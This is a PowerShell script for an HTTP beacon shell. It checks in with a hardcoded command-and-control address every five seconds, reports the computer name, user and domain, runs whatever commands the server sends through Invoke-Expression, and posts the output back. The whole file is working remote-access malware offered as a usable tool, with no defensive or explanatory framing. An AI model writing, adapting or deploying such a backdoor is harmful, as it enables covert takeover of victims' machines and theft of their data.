# HTTP Beacon Shell - Port 8080
# More reliable - uses HTTP requests, works through proxies
# Beacons every 5 seconds for commands

$C2 = "http://192.168.0.100:8080"
$ID = "$env:COMPUTERNAME-$PID"

function Beacon {
    param([string]$Data = "")
    try {
        $body = @{
            id = $ID
            user = "$env:USERDOMAIN\$env:USERNAME"
            host = $env:COMPUTERNAME
            data = $Data
        } | ConvertTo-Json

        $response = Invoke-RestMethod -Uri "$C2/beacon" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 10
        return $response
    } catch {
        return $null
    }
}

# Initial registration
Beacon -Data "[HTTP] Shell connected | PID:$PID"

while($true) {
    try {
        $task = Beacon
        if ($task -and $task.cmd) {
            $cmd = $task.cmd
            if ($cmd -eq "exit") { break }

            try {
                $output = iex $cmd 2>&1 | Out-String
            } catch {
                $output = "ERROR: $_"
            }

            Beacon -Data $output
        }
    } catch {}
    Start-Sleep -Seconds 5
}
